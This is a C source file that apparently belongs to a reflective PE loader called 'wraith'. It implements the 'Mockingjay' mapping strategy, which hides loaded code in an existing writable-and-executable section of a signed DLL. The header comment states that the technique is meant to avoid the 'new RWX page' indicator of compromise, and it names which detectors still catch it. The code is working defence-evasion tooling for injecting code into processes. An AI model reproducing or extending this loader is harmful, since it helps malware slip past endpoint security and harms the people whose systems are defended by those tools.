/*
 * src/mapping/map_mockingjay.c
 *
 * Mockingjay mapping strategy. Reuses a `MEM_IMAGE+RWX` region
 * already present in the process - typically a `.text` section of
 * a signed DLL that ships writable for legitimate self-modification
 * reasons (msys-2.0, certain SDK shims). Because no allocation
 * happens, the "new RWX page in process" IOC fires zero times.
 *
 * Trade-offs:
 *  - The region's underlying module is permanently corrupted for
 *  the host process's lifetime; if anything else in the process
 *  calls into the host's overlapping bytes, it crashes.
 *  - The region remains MEM_IMAGE backed by the host file.
 *  Detectors that hash the on-disk file vs in-memory bytes
 *  still detect.
 */

#include "core/wr_context_internal.h"
#include "mapping/map_mockingjay_scanner.h"
#include "mapping/map_strategy.h"
#include "pe/pe_constants.h"
#include "runtime/rt_api.h"

#include <stdlib.h>
#include <windows.h>

typedef struct mockingjay_state {
  void  *base;
  size_t available;
} mockingjay_state;

static wraith_status_t mj_reserve(struct wr_ctx *ctx, size_t size, void **out_base)
{
  if (!ctx || !out_base) {
  return WRAITH_E_NULL_ARG;
  }

  mockingjay_state *st = (mockingjay_state *)calloc(1, sizeof(*st));
  if (!st) {
  return wr_ctx_fail(ctx, WRAITH_E_OOM, "mockingjay: alloc state");
  }

  void  *base = NULL;
  size_t avail = 0;
  wraith_status_t rc = wr_mockingjay_find_region(size, &base, &avail);
  if (rc != WRAITH_OK) {
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_NO_HOST_DLL,
  "mockingjay: no MEM_IMAGE+RWX region "
  ">= %zu bytes available", size);
  }

  st->base  = base;
  st->available = avail;
  ctx->map_state = st;
  *out_base = base;
  return WRAITH_OK;
}

static wraith_status_t mj_commit(struct wr_ctx *ctx, void *addr, size_t size,
  wraith_prot_t initial_prot)
{
  /* Region is already RWX-backed by the host. Nothing to do. */
  (void)ctx; (void)addr; (void)size; (void)initial_prot;
  return WRAITH_OK;
}

static wraith_status_t mj_protect(struct wr_ctx *ctx, void *addr, size_t size,
  wraith_prot_t new_prot)
{
  /* Honor the loader's request to flip per-section protections;
  * even though the region was RWX it's good hygiene to demote
  * non-code sections to R/RW after copy. */
  if (!ctx || !addr || size == 0 || !ctx->rt_ops) {
  return WRAITH_E_NULL_ARG;
  }
  unsigned w32 = wr_prot_to_win32(new_prot);
  if (!w32) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_RWX_LEAK,
  "mockingjay: rejected RWX in protect");
  }
  unsigned old = 0;
  int rc = ctx->rt_ops->nt_protect(addr, size, w32, &old);
  if (rc != 0) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_PROTECT_FAILED,
  "mockingjay: NtProtect -> 0x%x",
  (unsigned)rc);
  }
  if (new_prot & (WRAITH_PROT_RX | WRAITH_PROT_RXC)) {
  ctx->rt_ops->nt_flush_icache(addr, size);
  }
  return WRAITH_OK;
}

static wraith_status_t mj_release(struct wr_ctx *ctx)
{
  /* Critical: we do NOT call NtFreeVirtualMemory or NtUnmapView
  * here - the host module owns this memory and the OS would
  * destabilize if we unmapped it. We simply leave the (now
  * scrambled) bytes in place. The host's MEM_IMAGE region
  * persists exactly as before. */
  (void)ctx;
  return WRAITH_OK;
}

static void mj_destroy(struct wr_ctx *ctx)
{
  if (!ctx) return;
  free(ctx->map_state);
  ctx->map_state = NULL;
}

const struct wr_map_ops wr_map_ops_mockingjay = {
  .name  = "mockingjay",
  .reserve = mj_reserve,
  .commit  = mj_commit,
  .protect = mj_protect,
  .release = mj_release,
  .destroy = mj_destroy,
};
